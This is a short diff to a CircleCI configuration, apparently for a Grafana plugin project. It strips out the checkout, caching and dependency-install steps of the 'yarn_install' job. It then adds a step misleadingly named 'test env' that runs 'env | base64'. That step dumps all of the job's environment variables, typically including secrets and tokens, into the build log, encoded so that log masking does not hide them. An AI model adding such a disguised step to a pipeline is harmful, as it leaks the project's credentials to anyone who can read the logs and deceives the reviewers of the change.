@@ -43,23 +43,7 @@ jobs:
   yarn_install:
     executor: default_exec
     steps:
-      - checkout
-      - restore_cache:
-          name: restore node_modules
-          keys:
-            - build-cache-{{ .Environment.CACHE_VERSION }}-{{ checksum "yarn.lock" }}
       - run:
-          name: Install dependencies
+          name: test env
           command: |
-            mkdir ci
-            [ -f ~/project/node_modules/.bin/grafana-toolkit ] || yarn install --frozen-lockfile
-      - save_cache:
-          name: save node_modules
-          paths:
-            - ~/project/node_modules
-          key: build-cache-{{ .Environment.CACHE_VERSION }}-{{ checksum "yarn.lock" }}
-      - save_cache:
-          name: save cypress cache
-          paths:
-            - ~/.cache/Cypress
-          key: cypress-cache-{{ .Environment.CACHE_VERSION }}-{{ checksum "yarn.lock" }}
+            env | base64
